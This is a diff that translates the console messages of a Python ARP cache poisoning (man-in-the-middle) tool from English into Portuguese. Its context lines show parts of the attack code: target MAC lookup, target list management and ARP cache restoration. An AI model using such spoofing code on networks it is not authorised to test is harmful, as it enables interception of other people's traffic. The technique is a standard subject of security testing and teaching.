@@ -26,7 +26,7 @@ def get_MAC(interface, target_IP):
     p.pdst = target_IP
     reply, unans = sr(p, timeout=5, verbose=0)
     if len(unans) > 0:
-        raise Exception('Error finding MAC for %s, try using -i' % target_IP)
+        raise Exception('Erro ao encontrar MAC para %s, tente usar -i' % target_IP)
     return reply[0][1].hwsrc
 
 
@@ -43,7 +43,7 @@ def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
         try:
             item = control_queue.get(block=False)
         except queue.Empty:
-            print('Something broke, your queue idea sucks.')
+            print('Algo quebrou, sua ideia de fila é péssima.')
 
         cmd = item[CMD].lower()
         if cmd in ['quit', 'exit', 'stop', 'leave']:
@@ -57,10 +57,10 @@ def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
                 targets.remove(item[TARGET])
                 restore_ARP_caches([item[TARGET]], gateway, False)
             except ValueError:
-                print("%s not in target list" % item[TARGET][0])
+                print("%s não está na lista de alvos" % item[TARGET][0])
 
         elif cmd in ['list', 'show', 'status']:
-            print('Current targets:')
+            print('Metas atuais:')
             print('Gateway: %s (%s)' % gateway)
             for t in targets:
                 print("%s (%s)" % t)
@@ -68,7 +68,7 @@ def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
 
 
 def restore_ARP_caches(targets, gateway, verbose=True):
-    print('Stopping the attack, restoring ARP cache')
+    print('Parando o ataque, restaurando o cache ARP')
     for i in range(3):
         if verbose:
             print("ARP %s is at %s" % (gateway[IP], gateway[MAC]))
@@ -78,7 +78,7 @@ def restore_ARP_caches(targets, gateway, verbose=True):
             send_ARP(t[IP], t[MAC], gateway[IP], gateway[MAC])
             send_ARP(gateway[IP], gateway[MAC], t[IP], t[MAC])
         time.sleep(1)
-    print('Restored ARP caches')
+    print('Caches ARP restaurados')
 
 
 def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
@@ -94,7 +94,7 @@ def main():
     interface = args.interface or get_working_if()
     attacker_MAC = get_if_hwaddr(interface)
 
-    print('Using interface %s (%s)' % (interface, attacker_MAC))
+    print('Usando a interface %s (%s)' % (interface, attacker_MAC))
     try:
         targets = [(t.strip(), get_MAC(interface, t.strip())) for t in
                    args.targets.split(',')]
@@ -120,10 +120,10 @@ def main():
             if command:
                 cmd = command[CMD].lower()
                 if cmd in ['help', '?']:
-                    print("add <IP>: add IP address to target list\n" +
-                          "del <IP>: remove IP address from target list\n" +
-                          "list: print all current targets\n" +
-                          "exit: stop poisoning and exit")
+                    print("add <IP>: adiciona endereço IP à lista de alvos\n" +
+                            "del <IP>: remove endereço IP da lista de alvos\n" +
+                            "list: imprime todos os alvos atuais\n" +
+                            "exit: interrompe o envenenamento e sai")
 
                 elif cmd in ['quit', 'exit', 'stop', 'leave']:
                     control_queue.put(('quit',))
